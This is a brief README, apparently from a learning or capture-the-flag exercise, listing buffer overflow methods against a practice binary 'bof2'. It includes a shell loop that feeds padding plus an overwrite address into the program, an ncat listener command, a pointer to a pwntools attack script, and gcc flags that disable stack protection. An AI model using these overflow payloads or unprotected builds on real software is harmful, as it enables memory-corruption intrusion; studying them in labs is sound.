# Buffer Overflow Script

# target File : bof2
# Source : bof2.c

# Buffer overflow Script Methods
***TASK 1 : Shell Script*** <br>
[+] method : shell script <br>
: use this shell scripting  about buffer overflow <br>
: for i in {10..32}; do echo $i; python -c "print 'A'* $i + '\x78\x56\x34\x12'" | ./bof2 ; done <br>

***TASK 2 : pwntool (python2)*** <br>
[+] method : python pwntool <br>
: use this pwntool code(Example)  about buffer overflow <br>
: ncat -c {file} -kl ip port
: Reference File : attack_script_pwntool.py <br>


# Stack Smash option for test 
gcc -m32 -o {file} {file.c} -fno-stack-protector -z execstack -mpreferred-stack-boundary=2  <br>
